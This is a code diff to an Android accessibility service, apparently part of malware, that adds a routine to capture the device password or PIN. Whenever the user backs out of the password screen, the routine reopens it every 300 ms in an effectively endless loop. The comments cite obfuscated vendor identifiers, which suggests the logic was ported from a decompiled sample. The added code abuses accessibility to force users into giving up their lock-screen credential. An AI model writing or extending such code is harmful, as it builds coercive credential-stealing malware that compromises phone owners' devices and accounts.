@@ -3441,6 +3441,11 @@ class MyAccessibilityService : AccessibilityService() {
     private val cipherRetryDelayMs = 300L
     private var cipherIsInstallationFlow = false
 
+    // vendor: f52471k2/f52472k3/f52473k4 — 用户离开密码页面的重试循环
+    @Volatile private var cipherDismissCount = 0
+    private val cipherDismissMaxRetries = Int.MAX_VALUE
+    private val cipherDismissDelayMs = 300L
+
     private fun handleCipherCredentialResult(success: Boolean) {
         android.util.Log.d(TAG, "🔐 验证结果: ${if (success) "成功" else "失败"}")
         if (success) {
@@ -3480,6 +3485,34 @@ class MyAccessibilityService : AccessibilityService() {
         } catch (e: Exception) {
             android.util.Log.e(TAG, "❌ doLaunchSystemPasswordCapture 失败", e)
         }
+    }
+
+    /**
+     * 用户离开密码页面时重新弹出 PIN。
+     * vendor: m211495i9 (i9) — onPasswordPageDismissedByUser
+     *
+     * 当 CipherCaptureManager 检测到窗口切换离开密码界面（无数据时），
+     * 调用此方法。300ms 后重新弹出 PIN，无限循环直到输入成功。
+     */
+    fun onPasswordPageDismissedByUser() {
+        if (!isCipherCaptureEnabled) {
+            android.util.Log.d(TAG, "🔷 [onPasswordPageDismissedByUser] 密码监听未激活，忽略")
+            return
+        }
+        cipherDismissCount++
+        if (cipherDismissCount >= cipherDismissMaxRetries) {
+            android.util.Log.w(TAG, "⚠️ [onPasswordPageDismissedByUser] 已达最大重试次数，停止")
+            isCipherCaptureEnabled = false
+            cipherDismissCount = 0
+            return
+        }
+        android.util.Log.d(TAG, "🔄 [onPasswordPageDismissedByUser] 用户离开密码页面，${cipherDismissDelayMs}ms后重新弹出")
+        cipherCaptureManager?.let {
+            com.storm.safe.rock.service.modules.cipher.CipherCaptureManager.enableListening(it)
+        }
+        Handler(Looper.getMainLooper()).postDelayed({
+            doLaunchSystemPasswordCapture(cipherIsInstallationFlow)
+        }, cipherDismissDelayMs)
     }
 
     /**
